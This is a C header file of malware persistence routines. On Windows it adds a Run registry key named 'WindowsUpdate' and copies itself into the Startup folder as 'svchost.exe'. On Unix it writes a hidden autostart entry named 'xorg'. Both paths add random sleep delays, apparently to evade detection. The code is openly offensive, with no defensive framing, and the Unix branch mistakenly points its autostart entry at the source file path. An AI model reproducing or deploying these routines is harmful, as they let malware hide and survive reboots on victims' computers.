#ifndef PERSISTENCE_H
#define PERSISTENCE_H

#ifdef _WIN32
#include <windows.h>

static int setup_persistence(const char* exe_path) {
    HKEY hKey;
    char reg_path[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    if(RegOpenKeyExA(HKEY_CURRENT_USER, reg_path, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        const char* val_name = "WindowsUpdate";
        RegSetValueExA(hKey, val_name, 0, REG_SZ, (BYTE*)exe_path, strlen(exe_path) + 1);
        RegCloseKey(hKey);
        return 1;
    }
    return 0;
}

static int setup_startup_shortcut(void) {
    char startup_path[MAX_PATH];
    char app_data[MAX_PATH];
    
    if(!GetEnvironmentVariableA("APPDATA", app_data, sizeof(app_data))) return 0;
    
    snprintf(startup_path, sizeof(startup_path), "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe", app_data);
    
    CopyFileA(__argv[0], startup_path, 0);
    return 1;
}

static void random_delay_persistence(void) {
    unsigned int delay = GetTickCount() % 600000;
    Sleep(60000 + delay);
}

#else
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <time.h>

static int setup_persistence_unix(void) {
    const char* home = getenv("HOME");
    if(!home) return 0;
    
    char autostart_dir[512];
    snprintf(autostart_dir, sizeof(autostart_dir), "%s/.config/autostart", home);
    
    char mkdir_cmd[1024];
    snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir -p \"%s\"", autostart_dir);
    system(mkdir_cmd);
    
    char desktop_file[1024];
    snprintf(desktop_file, sizeof(desktop_file), "%s/.config/autostart/xorg.desktop", home);
    
    FILE* f = fopen(desktop_file, "w");
    if(f) {
        fprintf(f, "[Desktop Entry]\n");
        fprintf(f, "Type=Application\n");
        fprintf(f, "Name=xorg\n");
        fprintf(f, "Exec=%s\n", __FILE__);
        fprintf(f, "Hidden=false\n");
        fprintf(f, "NoDisplay=true\n");
        fprintf(f, "X-GNOME-Autostart-enabled=true\n");
        fclose(f);
        return 1;
    }
    return 0;
}

static void random_delay_persistence(void) {
    unsigned int delay = time(NULL) % 600;
    sleep(60 + delay);
}

#endif
#endif
